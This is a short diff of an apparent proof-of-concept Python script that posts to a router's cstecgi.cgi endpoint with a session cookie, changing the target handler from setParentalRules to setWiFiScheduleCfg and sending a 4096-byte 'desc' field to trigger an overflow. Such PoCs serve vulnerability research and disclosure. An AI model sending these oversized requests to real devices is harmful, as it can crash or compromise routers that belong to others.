@@ -22,7 +22,7 @@ import requests
 url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
 cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
 data = {
-"topicurl":"setParentalRules",
+"topicurl":"setWiFiScheduleCfg",
 "addEffect":"1",
 "enable":"1",
 "desc":"b"*0x1000,
